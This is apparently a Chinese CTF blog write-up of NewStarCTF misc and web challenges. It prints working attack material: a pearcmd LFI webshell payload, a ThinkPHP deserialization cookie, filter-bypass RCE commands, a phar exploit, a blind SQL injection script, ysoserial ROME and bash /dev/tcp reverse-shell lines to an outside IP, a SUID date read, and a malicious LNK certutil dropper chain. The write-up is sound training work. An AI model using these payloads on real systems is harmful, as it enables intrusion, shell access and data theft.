---
title: NewStarCTF
date: 2023/5/31 19:48:25
categories:
- CTF

---



# misc

## week5

### 最后的流量分析

先按照数据包大小排列，看了几个包发现是sql布尔盲注（上周的sql我用的就是布尔盲注）。

![image-20221020130300434](../images/image-20221020130300434-1686150281425.png)

上图为正确回显

进行过滤

![image-20221020130340038](../images/image-20221020130340038-1686150281425.png)

一个一个找就行了



### 奇怪的PDF 2

下载下来是一个快捷方式，打开是《欺骗的艺术》这本书。😱

它是快捷方式，很自然就去看它指向了哪个文件

![image-20221020130709420](../images/image-20221020130709420-1686150281425.png)

```shell
%SystemRoot%\system32\cmd.exe /c copy "strange2.pdf.lnk" %tmp%\\g5ZokyumBB2gDn.tmp /y

for /r C:\\Windows\\System32\\ %i in (*ertu*.exe) do copy %i %tmp%\\msoia.exe /y

findstr.exe"TVNDRgAAAA"%tmp%\\g5ZokyumBB2gDn.tmp>%tmp%\\cSi1r0uywDNvDu.tmp&%tmp%\\msoia.ex
```

然后搜索msoia.exe就得到了类似的题

https://www.anquanke.com/post/id/267031

https://www.cnblogs.com/hed10ne/p/15841253.html

> 目标的最大长度只有260个字符，而命令行参数的最大长度是4096个字符

读取完整命令

```python
import sys
import win32com.client # pip install pywin32

shell = win32com.client.Dispatch("WScript.Shell")
shortcut = shell.CreateShortCut("20200308-sitrep-48-covid-19.pdf.lnk")
print(shortcut.Targetpath)
print(shortcut.Arguments)
```

```python
PS D:\python3.8\code> python -u "d:\python3.8\code\0.py"
C:\Windows\System32\cmd.exe
/c copy "strange2.pdf.lnk" %tmp%\\g5ZokyumBB2gDn.tmp /y&for /r C:\\Windows\\System32\\ %i in (*ertu*.exe) do copy %i %tmp%\\msoia.exe /y&findstr.exe "TVNDRgAAAA" %tmp%\\g5ZokyumBB2gDn.tmp>%tmp%\\cSi1r0uywDNvDu.tmp&%tmp%\\msoia.exe -decode %tmp%\\cSi1r0uywDNvDu.tmp %tmp%\\oGhPGUDC03tURV.tmp&expand %tmp%\\oGhPGUDC03tURV.tmp -F:* %tmp% &wscript %tmp%\\9sOXN6Ltf0afe7.js
```

`oGhPGUDC03tURV.tmp`的文件头是MSCF，是微软的.cab压缩文件格式

![image-20221020131408248](../images/image-20221020131408248-1686150281425.png)

使用命令`expand %tmp%\\oGhPGUDC03tURV.tmp -F:* 解压路径`得到

![image-20221020131537014](../images/image-20221020131537014-1686150281425.png)

flag在flag.txt中

js脚本

```js
var e7926b8de13327f8e703624e = new ActiveXObject("WScript.Shell");e7926b8de13327f8e703624e.Run ("cmd /c mkdir %tmp%\\flag&&move /Y %tmp%\\cSi1r0uywDNvDu.tmp %tmp%\\flag\\flag.txt&\"%tmp%\\strange2.pdf\"",0);
```



### Yesec no drumsticks 5

#### git工作原理

<img src="E:\typora img\git-command.jpg" alt="img" style="zoom:150%;" />

- workspace：工作区--本地目录（比如我`git init Test`创建了一个空仓库，那么`Test`这个目录就是workspace）
- staging area：暂存区/缓存区--.git目录下的index文件（`git add` 或者`git stash`）
- local repository：版本库或本地仓库--.git目录下的objects目录
- remote repository：远程仓库--github

以本题为例，其`.git`目录如下

![image-20221020162618015](../images/image-20221020162618015-1686150281425.png)

#### 解题

![image-20221020163752820](../images/image-20221020163752820-1686150281425.png)

index中有flag.txt文件

恢复缓存工作区`git stash pop`

![image-20221020163917173](../images/image-20221020163917173-1686150281426.png)

回滚`git reset --hard commit_id`后，读取flag.txt得到`flag{Yesec#1s#c@ibi}`

#### 总结

源码泄露

1. git回滚

   查看历史版本

   ```shell
   git log
   ```

   回滚到历史版本

   ```shell
   git reset --hard commit_id
   ```

   > 实际上就是将HEAD指向commit_id

2. git缓存

   将当前工作区缓存

   ```shell
   git stash
   ```

   恢复缓存

   ```shell
   git stash pop
   ```

   回滚到缓存版本

   ```shell
   git reset --hard commit_id
   ```

   



# web

### week2

#### ezapi

graphql

漏洞：https://mp.weixin.qq.com/s/gp2jGrLPllsh5xn7vn9BwQ

使用语法：https://blog.csdn.net/weixin_39130261/article/details/118547853



### week3

#### IncludeTwo

```php 
<?php
error_reporting(0);
highlight_file(__FILE__);
//Can you get shell? RCE via LFI if you get some trick,this question will be so easy!
if(!preg_match("/base64|rot13|filter/i",$_GET['file']) && isset($_GET['file'])){
    include($_GET['file'].".php");
}else{
    die("Hacker!");
}
```

本地文件包含（LFI）绕过后缀名添加，使用pearcmd.php绕过。

p神的文章：https://tttang.com/archive/1312/#toc_0x06-pearcmdphp

> pecl是PHP中用于管理扩展而使用的命令行工具，而pear是pecl依赖的类库。(类似于python中的pip)在7.3及以前，pecl/pear是默认安装的；在7.4及以后，需要我们在编译PHP的时候指定`--with-pear`才会安装。
>
> 不过，在Docker任意版本镜像中，pcel/pear都会被默认安装，安装的路径在`/usr/local/lib/php`
>
> pear中有一个命令config-create，阅读其代码和帮助，可以知道，这个命令需要传入两个参数，其中第二个参数是写入的文件路径，第一个参数会被写入到这个文件中。

payload

```php
?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=eval($_POST['cmd'])?>+/tmp/hello.php
```

然后一句话木马就会被写入/tmp/hello.php中，我们只需包含这个文件即可。



#### Maybe You Have To think More

5.1.41LTS ThinkPHP框架反序列化漏洞https://www.freebuf.com/vuls/269882.html

这道题反序列化点在cookie中

payload

```php
cookie:
TzoyNzoidGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzIjoxOntzOjM0OiIAdGhpbmtccHJvY2Vzc1xwaXBlc1xXaW5kb3dzAGZpbGVzIjthOjE6e2k6MDtPOjE3OiJ0aGlua1xtb2RlbFxQaXZvdCI6Mjp7czo5OiIAKgBhcHBlbmQiO2E6MTp7czo1OiJldGhhbiI7YToyOntpOjA7czozOiJkaXIiO2k6MTtzOjQ6ImNhbGMiO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czo1OiJldGhhbiI7TzoxMzoidGhpbmtcUmVxdWVzdCI6Mzp7czo3OiIAKgBob29rIjthOjE6e3M6NzoidmlzaWJsZSI7YToyOntpOjA7cjo5O2k6MTtzOjY6ImlzQWpheCI7fX1zOjk6IgAqAGZpbHRlciI7czo2OiJzeXN0ZW0iO3M6OToiACoAY29uZmlnIjthOjE6e3M6ODoidmFyX2FqYXgiO3M6MDoiIjt9fX19fX0=&id=whoami
    
?dajs=ls
```

flag在环境变量里。





### week4

#### So Baby RCE

```php
<?php
error_reporting(0);
if(isset($_GET["cmd"])){
    if(preg_match('/et|echo|cat|tac|base|sh|more|less|tail|vi|head|nl|env|fl|\||;|\^|\'|\]|"|<|>|`|\/| |\\\\|\*/i',$_GET["cmd"])){
       echo "Don't Hack Me";
    }else{
        system($_GET["cmd"]);
    }
}else{
    show_source(__FILE__);
}
```

过滤了很多。主要是

- 关键词绕过

  通配符，插入空字符绕过等等

- ；绕过

  %0a或者&&绕过

- /绕过

  `ls /` == `cd 路径；ls`

  返回上级目录 `cd ..`

- 空格绕过

  `${IFS}`等等

  

payload

```php
?cmd=cd${IFS}..%0acd${IFS}..%0acd${IFS}..%0aca$1t${IFS}ffff$1llllaaaaggggg
```



#### BabySSTI_Two

unicode编码绕过，catch_warnings被过滤，换一个类比如os._wrap_close就好了。



#### UnserializeThree

考点：phar反序列化，#绕过

文件上传给出上传后文件路径

注释中提示class.php

```php
<?php
highlight_file(__FILE__);
class Evil{
    public $cmd;
    public function __destruct()
    {
        if(!preg_match("/>|<|\?|php|".urldecode("%0a")."/i",$this->cmd)){
            //Same point ,can you bypass me again?
            eval("#".$this->cmd);
        }else{
            echo "No!";
        }
    }
}

file_exists($_GET['file']);
```

#绕过

1. 闭合php标签
2. \n
3. \r

这里只能用\r。



payload

```php
<?php
    class Evil{
        public $cmd;
        public function __construct()
        {
            $this->cmd = "\rsystem('cat /flag');";
        }
        public function __destruct()
        {
            if(!preg_match("/>|<|\?|php|".urldecode("%0a")."/i",$this->cmd)){
                //Same point ,can you bypass me again?
                eval("#".$this->cmd);
                echo "#".$this->cmd;
            }else{ 
                echo "No!".$this->cmd;
            }
        }
    }
    $phar = new Phar("test.phar");//生成的压缩文件名为test.phar
    $phar->startBuffering();
    //设置stub
    $phar->setStub("<?php __HALT_COMPILER(); ?>");
    //将自定义的meta-data存入manifest
    $a = new Evil();
    $phar->setMetadata($a);
    //添加要压缩的文件
    $phar->addFromString("test.txt", "test");
    //签名自动计算
    $phar->stopBuffering();
?>
```

将生成的phar改图片后缀名上传后，在class.php下用phar协议访问（只要是phar文件，后缀名是什么都可以解析）

```php
/class.php?file=phar://file_path
```





#### 又一个SQL

0^0和0^1，回显两种情况，猜测使用盲注。

payload

```python
import requests
import time
from urllib import parse


#数字
#0^(ascii(substr((select(database())),{},1))>{})
#单引号
#0' or (ascii(substr((select(database())),{},1))>{}) or '0


url="http://afe4417f-e94a-484b-bd96-f8a0e17414a5.node4.buuoj.cn:81/comments.php"
url2="http://14a849d8-1ab5-4d00-a4d6-62d9671f66b0.node4.buuoj.cn:81/comments.php?name=c"


def SqlBlind():

    result=""

    for i in range(1,1000):
        left = 32
        right = 127
        mid=(left+right)//2

        while left < right:
#wfy_admin,wfy_comments,wfy_information
#where(user='f1ag_is_here')
            params={
                # 'name':"0^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),{},1))>{})".format(i,mid),
                # 'name':"c",
                # 'comment':"hack",
                # 'name':"0^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{},1))>{})".format(i,mid),
                # 'name':"0^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='wfy_information')),{},1))>{})".format(i,mid),
                 'name':"0^(ord(substr((select(group_concat(text))from(wfy_comments)where(user='f1ag_is_here')),{},1))>{})".format(i,mid),
            }

            # 请求方式
            #r=requests.get(url=url,params=params)
            r=requests.post(url=url,data=params)
            #print(r.text)
            
            # 防止429
            if r.status_code == 429:
                time.sleep(0.5)
            
            #r=requests.get(url=url2)

            # 编码
            #r=str(r.json())
            
            

            # True的标志  0的个数
            if "好耶" in r.text:
            # if r.text.count('0')==i:
                left = mid+1
            else:
                right = mid

            mid=(left+right)//2

        if left <=32 or right >= 127:
            break

        result += chr(mid)

        print("[+]",result)
                

if __name__ == '__main__':
    SqlBlind()
```



#### Rome

```jaVa
@Controller
/*    */ public class SerController
/*    */ {
/*    */   @GetMapping({"/"})
/*    */   @ResponseBody
/*    */   public String helloCTF() {
/* 19 */     return "Do you like Jvav?";
/*    */   }
/*    */   @PostMapping({"/"})
/*    */   @ResponseBody
/*    */   public String helloCTF(@RequestParam String EXP) throws IOException, ClassNotFoundException {
/* 24 */     if (EXP.equals("")) {
/* 25 */       return "Do you know Rome Serializer?";
/*    */     }
/* 27 */     byte[] exp = Base64.getDecoder().decode(EXP);
/* 28 */     ByteArrayInputStream bytes = new ByteArrayInputStream(exp);
/* 29 */     ObjectInputStream objectInputStream = new ObjectInputStream(bytes);
/* 30 */     objectInputStream.readObject();
/* 31 */     return "Do You like Jvav?";
/*    */   }
/*    */ }
```

反序列化点

```java
objectInputStream.readObject();
```

ROME反序列化分析

https://www.yulate.com/292.html

> java版本要jdk8u-121照着文章本地复现了，但是用ysoserial写了反弹shell，题目的发送过去不可以

这周发现只要把payload拿去url编码后就可以了。

这里思考了得出的结果是

> RFC3986中指定了以下字符为保留字符：! * ' ( ) ; : @ & = + $ , / ? # [ ]
>
> 　　不安全字符：还有一些字符，当他们直接放在URL中的时候，可能会引起解析程序的歧义。这些字符被视为不安全字符，原因有很多。
>
> - 空格：Url 在传输的过程，或者用户在排版的过程，或者文本处理程序在处理Url的过程，都有可能引入无关紧要的空格，或者将那些有意义的空格给去掉。
> - 引号以及<>：引号和尖括号通常用于在普通文本中起到分隔Url的作用
> - \#：通常用于表示书签或者锚点
> - %：百分号本身用作对不安全字符进行编码时使用的特殊字符，因此本身需要编码
> - {}|\^[]`~：某一些网关或者传输代理会篡改这些字符

而base64加密后可能会出现`+,/,=`



解题步骤

```shell
java -jar ysoserial.jar ROME "bash -c {echo,xxx}|{base64,-d}|{bash,-i}" > 1.txt
```

xxx为base64后的`bash -i >& /dev/tcp/ip/2333 0>&1`

这里`> 1.txt`是因为如果我加了`|base64`生成了之后会出现其他符号

![image-20221018174601257](../images/image-20221018174601257-1686150281426.png)

用python或者cyberchef来base64加密

exp

```
EXP=对上面生成的base64再进行url编码
```

连接后flag在根目录

![image-20221018174256886](../images/image-20221018174256886-1686150281426.png)





### week 5

#### So Baby RCE Again

直接利用`>`写入木马，然后一开始使用蚁剑连接

读取根目录下的start.sh

```shell
#!/bin/bash
echo $FLAG > /ffll444aaggg && export FLAG=not && FLAG=not && chmod 700 /ffll444aaggg && \
service apache2 restart && \
tail -f /dev/null
```

这里`chmod 700 /ffll444aaggg`的意思就是/ffll444aaggg只有root用户可以访问。

然后第一个想到的就是用suid提权，因为之前哪一周的misc是用到了这个知识点。

但是没有想到的是蚁剑的终端太不好用了（其实我之前觉得蚁剑挺强的，因为它自带那些绕过插件）

比如变量赋值没用

![QQ图片20221019102635](../images/QQ图片20221019102635-1686150281426.png)

查找具有suid的命令没用

![image-20221019102841851](../images/image-20221019102841851-1686150281426.png)

反弹shell

```shell
bash -c 'bash -i >& /dev/tcp/120.77.73.212/2333 0>&1'
```

```shell
www-data@out:/$ find / -user root -perm -4000 -print 2>/dev/null
find / -user root -perm -4000 -print 2>/dev/null
/bin/date
/bin/mount
/bin/su
/bin/umount

www-data@out:/$ date -f ffll444aaggg
date -f ffll444aaggg
date: invalid date 'flag{1f005b40-39e2-4538-8816-3e27bdd98352}'
```

![QQ图片20221019103452](../images/QQ图片20221019103452-1686150281426.png)



#### final round

时间盲注

